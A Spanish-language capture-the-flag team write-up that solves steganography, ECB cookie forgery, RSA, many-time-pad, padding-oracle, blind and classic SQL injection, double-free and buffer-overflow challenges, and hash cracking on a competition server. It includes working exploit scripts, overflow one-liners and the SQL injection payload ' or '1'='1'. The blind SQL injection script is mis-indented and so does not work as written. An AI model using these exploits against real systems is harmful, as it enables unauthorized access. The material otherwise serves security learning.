Parrosky - Felipe Parra
Linkhl - Andrés Hernández
AladMocu - Albert Adolfo Mlano


# Steganography

> Todos

Se adjunta una carpeta con el script y los resultados. 
El script básicamente es un archivo en c que lee la imagen en formato bmp y se ubica en la parte de los datos (nos saltamos los headers(excepto el tamaño)).
Cuando ya tengo el apuntador a los datos es manejo de bits con corrimientos, genero una mascara llena de unos y hago corrimiento dependiendo de cuantos bits significativos
quiero leer (ya que no sabíamos en cuantos bits se estaban guardando).

Se corrió el script para que leyera la imagen y sacara los n bits más significativos de 1 a 5, se guardaron los archivos, buscamos en internet
el valor binario de `lowbits{` y en vsCode le dimos ctr+F y lo encontramos en el primero. borramos lo de antes del mensaje que buscabamos y luego buscamos el final pasando a binario `}` ctf+F de nuevo para encontrar la secuencia y se borra lo de ahí para adelante. Como tenemos todos los bits se paso a un traductor de bits a str y wala.

# ECB 

> Andres Hernandez

Okey, este lo que hice fue que aprovecharme de la vulnerabilidad del cifrado por bloques. Lo más dificil era averiguar el tamño del bloque, pero lo daban en la pista c:
entonces cuando corrí en el shell, me botaba la siguiente info (dos parejas de texto claro, texto cifrado):

cookie de admin
`
7ee6891fc92abe0d8d961378727a034ce04f4bfde096a466cb9ffefcd1efbc6d9591c8418d5b25949e690590a3d546525dfeb1d9a5d04fb8ce8b736271432992`
Yo SI soy un administrador-La cookie expira en 2017-01-01.......

cookie no admin
`416d437c10fa47c793bb7d6fd7f078bee04f4bfde096a466cb9ffefcd1efbc6d9591c8418d5b25949e690590a3d54652d3cd8743c8a1b25df491c12c69c940a4`
Yo NO soy un administrador-La cookie expira en 2022-01-01.......

Entonces pues parti las cookies en bloque de texto claro - bloque texto cifrado.
```
7ee6891fc92abe0d  Yo SI so
8d961378727a034c  y un adm
e04f4bfde096a466  inistrad
cb9ffefcd1efbc6d  or-La co
9591c8418d5b2594  okie exp
9e690590a3d54652  ira en 2
5dfeb1d9a5d04fb8  017-01-0
ce8b736271432992  1.......
```
```
Lo mismo para la cookie de no admin
416d437c10fa47c7  Yo NO so
93bb7d6fd7f078be  y un adm
e04f4bfde096a466  inistrad
cb9ffefcd1efbc6d  or-La co
9591c8418d5b2594  okie exp
9e690590a3d54652  ira en 2
d3cd8743c8a1b25d  022-01-0
f491c12c69c940a4  1.......
```
Analizando las secuencias de bytes, se encuentra que la parte central de ambas es exactamente igual y corresponde al siguiente texto:
`e04f4bfde096a466cb9ffefcd1efbc6d9591c8418d5b25949e690590a3d54652`
inistrador-La cookie expira en 2

Por lo cual lo único que debemos hacer es armar una nueva cookie diciendo que somos admins y que tenga tiempo valido, por lo que mantenemos lo que es igual,
tomamos los dos primeros bloques de la cookie de admin y los dos ultimos bloques de la cookie con valides. Con esto obtenemos una cookie de admin y valida! :3

`7ee6891fc92abe0d8d961378727a034ce04f4bfde096a466cb9ffefcd1efbc6d9591c8418d5b25949e690590a3d54652d3cd8743c8a1b25df491c12c69c940a4`
Yo SI soy un administrador-La cookie expira en 2022-01-01.......



# Close primes RSA

> Albert Molano y Andres Hernandez

```
65537,151428200030704122317317491859806898233587472500255531181207568909609873116833209084595407366577416518937511140954562796839794023491430920872300949969893764202172702166868759556275217009526072037126964517217501144734508545341830369013564980352920416700662259686668070357568608490515265423307951126901290843623
```
El flag cifrado con la llave privada correspondiente es: 

```
123329463993050745587508829506861368811309283827690243218384031415193981320357657289803495236797345996433732676448411487888263262034489628838043546283651295552286022227481626890746309698127118208828329558605477210150368185061497906617506085547869176887758501891939601950606209374104629658025112511327375596640L,
```

cipherText = ```123329463993050745587508829506861368811309283827690243218384031415193981320357657289803495236797345996433732676448411487888263262034489628838043546283651295552286022227481626890746309698127118208828329558605477210150368185061497906617506085547869176887758501891939601950606209374104629658025112511327375596640L```

El problema aquí esta en encontrar p y q (es decir factorizar n...) porque si tengo estos dos números, ya puedo realizar todo el algoritmo ya que a partir de estos se encuentra la
información necesaria para descifrar el mensaje (porque obtengo la llave pública).
```
n = p * q
phi = (p-1) *(q-1)
// n y esta en la llave pública.
n = 151428200030704122317317491859806898233587472500255531181207568909609873116833209084595407366577416518937511140954562796839794023491430920872300949969893764202172702166868759556275217009526072037126964517217501144734508545341830369013564980352920416700662259686668070357568608490515265423307951126901290843623
e = 65537
```

Para enncontrar esto numeros me base en el dato que nos mencionaron diciendo que eran primos cercanos asi que se uso una pagina de analisis de numeros para ver si eran conocidos: https://www.alpertron.com.ar/ECM.HTM el sesultado fue que si era asi y con esto se obtuvo:

p: `12305616605059013552060604331678676111973094826286729907754156819682227095370573283713021544249004812580338406138387893805119065415137021719015513296049607`
q: `12305616605059013552060604331678676111973094826286729907754156819682227095370573283713021544249004812580338406138387893805119065415137021719015513296049889`

Una vez que encontramos p y q, simplemente fue utilizar un programa que ejecutará RSA. Para decifrar el mensaje, como fue encriptado con la llave pública lo único que tocaba hacer
era encriptar de nuevo pero con la llave privada (es decir, decifrar puesto que así funciona la criptografía de llave pública, llave privada). Y el valor cifrado nos lo daban,
por lo que desciframos y el resultado fue:

RESULTADO 


Entre los tres (teamwork)

# One Time Path trouble

> Todos

Aquí intentamos un monton de cosas, sabiendo que por las propiedades de XOR sabemos que (c de cifrado, m de msj y k de la llave):

`c_1 = m_1 XOR k`
`c_2 = m_2 XOR k`
`c_1 XOR c_2 = m_1 XOR k XOR m_2 XOR k = m_1 XOR m_2`

Entonces lo que se hizo fue que como sabíamos que algunos mensajes se cifraban con la misma llave, podíamos ir obteniendo parte del mensaje
original cuando haciamos XOR entre los dos mensajes. Teníamos varios mensajes, entonces fue empezar a hacer varias combinaciones entre mensajes
para ir armando los textos de los mensajes. Si lograbamos decifrar un mensaje, simplemente tendríamos que hacer XOR entre el msj en texto claro y
el mensaje texto cifrado y obteniamos la llave. Fue un proceso tedioso.

Texto cifrado que nos daban:
```
790915445d0647055514545415125c0659445a43555647545c0747025a055a11544540001509500a42515f51144b1a4b07020300070a06060754070006000600
74145c44400c52135552585915034643585515015047555b59001507510d15525e525145571650055a554714431614005910525d515d1459540d50401a1c1a01
79091546510d510846475418541358065a405443525c5a445c055011550359545c535a1150445905114250475a0941065c5f5f12515d14444709575e515f5541
6107585b474354415c55525d4746400d145541024046511751041507510f505650555d0a5b44510111435046430c570c5a105012595914051b53000701070107
63035b51590c4641465b555d54025a43555815065f56595e520e194355155452505b5b161505150850431506065f04551b1e1f03040905050457040305030503
630e5c47140a46415e41424c1514540d505b584342474151534f1b4d025703070700025303520352070603020353025303060704030e02020350030402040204
630e5014570c460c5b471d185c15150258581517595240175c1219435b1315544753464542054648115f4714501351171547585e591856511b481b0503050305
740f505a570a5441514711545446530c46595443555614525b025a0d40135443115a55454301470050541b1a1b5d0c5d0d08090a0d000c0c0d5e0d0a0c0a0c0a
```
PROCESO: 
Se realizo el xor entre cada una de las lineas buscando donde se encontraban huecos que harian que se revelaran caracteres

Al final, cuando aún faltaban algunos caracteres, nos percatamos que uno de los mensajes coincidia con el texto claro que obtuvimos por medio de espionaje en texto claro B|

Texto claro:
`Tenemos rodeado al enemigo, atacamos a las 23:00...1111111111111`
Texto cifrado correspondiente:
`63035b51590c4641465b555d54025a43555815065f56595e520e194355155452505b5b161505150850431506065f04551b1e1f03040905050457040305030503`

Sabiendo esto, encontramos lo que necesitabamos (una pareja de texto claro, texto cifrado). XOR y el resto es historia


# LarryEllisonPadding

Esta vulnerabilidad la sacamos ya que la pagina nos decia cuando el padding era invalido, con esto aprovechamos  y realizamos un Pading Oracle Attack usando las librerias pwn y pwn:

> Albert Molano

```py
from pwn import *
from pwn import BadPaddingException, PaddingOracle
import json
from Crypto.Cipher import AES

class PadBuster(PaddingOracle):
    def oracle(self, data):
        while True:
            try:
                r = remote("shell.lowbits.io", 9561)
                r.recvuntil("el flag:")
                s = data
                s = str(data).encode("hex")
                r.sendline(s)
                out = r.recvall()
                if "Padding Invalido" in out:
                    raise BadPaddingException
                return
            except (socket.error, socket.gaierror, socket.herror, socket.timeout) as e:
                print str(e)

if __name__ == '__main__':
    d = {"username": "el pepe", "is_admin": "true", "expires": "2021-01-01"}
    s = json.dumps(d)
    print s
    thepadding = PadBuster()
    encrypted = thepadding.encrypt(s, block_size=AES.block_size, iv="no se un iv xd")

    print "Flag pls: %r" % (str(encrypted).encode("hex"))
```


# Blind SQL Injection 
> Albert Molano y Andres Hernandez

El nombre nos decia todo, lo unico necesario era realizar una blindSQL, asi que se intentaron un monton de payloads hasta que alguna nos diera como resultado un valor de login exitoso.
una vez se obtiene la payload seaprovecha la devolucion de que es correcta la consulta y proseguimos a usar el nombre de usuario admin que se conoce existe en la DB por el uso de `admin 'AND 1=1'` y se realiza fuerza bruta de el primer elemento en la columna `flag` 

```py
import requests 
import sys 
def blind(query): 
	url = "https://shell.lowbits.io/problem/5558/login.php" 
	response = requests.post(url, data={"username":"admin' " +query+ " -- .","password":"thegame","debug":"1"}) 
	return response 
keyspace = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$^&*()-=+{}' query_left_side = "AND 1=(SELECT 1 FROM users WHERE flag LIKE '" 
flag = "" 
num_of_queries = num_of_true_queries = 0  
while  True: 
	num_of_queries += 1  
	for k in keyspace: 
		query = query_left_side + k + "%')" 				
	response = blind(query) 		
	sys.stdout.write('\rFlag: '+flag+k) 
	if  "Login exitoso"  in response.text:
	 	num_of_true_queries += 1 
	 	query_left_side += k 
	 	flag += k 
	 	break 
print() 
print("flag found!: " + flag)
```

# DoubleFree

> Albert Molano

El nombre nos indica que se cometio una vulnerabilidad DoubleFree, y nos dan un numero al acceder al programa, lo cual asumimos es el buffer, ya con estas 2 cosas la solucion es trivial
```py
from pwn import *

#plantilla pwd
exe = context.binary = ELF('/problems/doublefree_19_d613dee7f78e401c08129ecd95dda677/vuln')

def  start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
	else:
		return process([exe.path] + argv, *a, **kw)
#ataque
io = start()
io.recvuntil("accidental)\n")
dir=int(io.recvline())
io.sendline("el pepe")
payload = p32(exe.got["exit"] - 12) + p32(dir + 8) + asm('push {};ret;'.format(hex(exe.symbols["win"])))
io.sendlineafter("util...",payload)

print io.recvall()
```
# Simple Buffer Overflow 32
> Felipe parra
Con este numeral se siguió la guía adjunta en la competencia del enlace https://www.lowbits.io/competencia/ obteniendo como resultado que la dirección de memoria a sobre escribir es "" con un padding de 44 bytes. Empleando la siguiente sentencia:
```
python -c "print 44*'a'+'\x26\x85\x04\x08'" |./vuln
```
# Simple Buffer Overflow 64
> Felipe parra
Con este numeral se siguió la guía adjunta en la competencia del enlace https://www.lowbits.io/competencia/ obteniendo como resultado que la dirección de memoria a sobre escribir es "\x47\x06\x40\x00\x00\x00\x00\x00" con un padding de 40 bytes. Empleando la siguiente sentencia:
```
python -c "print 40*'a'+'\x47\x06\x40\x00\x00\x00\x00\x00'" |./vuln
```
# Easy SQL Injection
> Felipe parra
Al primer intento se realiza la autenticación con cualquier nombre de usuario y como contraseña la inyección de:
```sql
' or '1'='1';
```
Así la concatenación no tendrá en cuenta si la contraseña en válida o no.
# Simple Passwrod Hash 1
> Felipe parra
Empleando un diccionario opensource que poseo de aproximadamente de más de 10.000 millones de valores de hash precalculados para sha 1 se buscó dentro de él la coincidencia para el hash affe4c6c966703bac4f60eb51e31cfa9981ca312
cuyo resultado fue "edificio"
# Simple Password Hash 2
> Felipe parra
Empleando un diccionario opensource que poseo de aproximadamente de más de 10.000 millones de valores de hash precalculados para sha 1 se buscó dentro de él la coincidencia para el hash 
85ab41802e6ca22c15392bc72a8c8aa6e4d61bf0
cuyo resultado fue "V3RD4D"
